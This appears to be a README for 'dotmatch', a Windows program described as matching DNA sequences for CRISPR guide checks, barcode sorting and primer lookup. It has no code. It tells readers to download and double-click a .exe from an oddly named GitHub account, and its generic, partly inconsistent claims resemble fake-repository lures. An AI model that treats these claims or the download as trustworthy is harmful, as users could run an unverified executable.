# 🧬 dotmatch - Map DNA sequences to targets fast

[![Download dotmatch](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/lehighriveraquilegiacanadensis128/dotmatch)

dotmatch identifies short DNA sequences. Common tasks include checking CRISPR guides, sorting barcodes, or finding primers. The tool compares your input data against a known list of targets. It operates with speed and accuracy across large data files.

## 📥 How to download the software

This software runs on Windows. You do not need to install complex tools or write code.

1. Go to the [official release page](https://github.com/lehighriveraquilegiacanadensis128/dotmatch).
2. Look for the section labeled Releases.
3. Find the file ending in .exe for Windows.
4. Click the file name to start the download.
5. Save the file to a folder on your computer.

## ⚙️ System requirements

Your computer needs specific parts to run this tool well.

- Operating System: Windows 10 or Windows 11.
- Memory: 8 gigabytes of RAM is enough for standard DNA files. 16 gigabytes works better for very large datasets.
- Storage: 100 megabytes of free space for the program files.
- Processor: Any modern processor from the last five years handles the calculations.

## 🚀 Running the program

Once you download the file, follow these steps to execute the program.

1. Open the folder where you saved the dotmatch file.
2. Double-click the file named dotmatch.exe.
3. A black command window appears on your screen. This window displays the progress of your task.
4. The program asks you for the location of your target file. Type the path to your file and press Enter.
5. The program then asks for the location of your sequence file. Provide that path and press Enter.
6. dotmatch saves the result in a new file within the same folder.

## 🛠️ Using input files

The software expects simple text files for sequences. You can use standard FASTA or FASTQ files.

- Targets file: A list of known DNA strings. Each line should contain one target.
- Sequences file: The raw data from your experiment. 

Keep both files in the same folder as dotmatch.exe to make the process easier. Use short names for your files to reduce typos. Avoid spaces or special characters in file names. Simple names like targets.txt and samples.fastq work best.

## 📊 Understanding your results

The output file provides a clear list of matches. Each line shows the sequence from your sample and the target identifier. If the software finds no match, it marks the entry as unassigned. You can open these result files in any spreadsheet program like Excel to analyze the data further.

## 🧩 Common tasks

Researchers use dotmatch for several daily operations.

- CRISPR guide validation: Check if your guides match the intended sites.
- Barcode demultiplexing: Sort your sequencing runs by specific tags.
- Primer check: Confirm the location of primers in your experiment.
- Panel analysis: Scan your data against a panel of known markers.
- Whitelist filtering: Remove samples that do not appear in your whitelist.

## 🔧 Troubleshooting

If the program closes unexpectedly, check these common points.

- File format: Ensure your input files are plain text. Do not use Microsoft Word documents.
- File path: If the program says it cannot find a file, verify the path. Avoid using paths that contain special symbols.
- Memory limits: Very large files can consume all your computer memory. If your computer slows down, close other programs before running dotmatch.
- Permissions: Some computers prevent files from running in protected folders. Move the program to your Documents folder if you see an error about access.

## 💻 Technical details

The software uses efficient search patterns. It calculates the edit distance between your sequences and targets. This method accounts for minor errors during sequencing. The program language is C. This choice ensures maximum speed for your work during large genomic analysis tasks. The tool processes millions of sequences in seconds. It handles diverse file types common in current lab workflows. You do not need to adjust settings for most tasks. The program uses sensible defaults to give you accurate results immediately.

## 🤝 Support and updates

This project receives frequent updates to improve performance. Check the main page periodically for new versions. If you notice a bug, report it on the repository page. Provide the steps you took to run the program when you submit a report. Include an example of the input file if possible. This helps identify the issue and release a fix. You can also view the history of changes on the repository site. These notes explain what the latest version improves or adds to the software. Use the latest version to ensure you have the best results.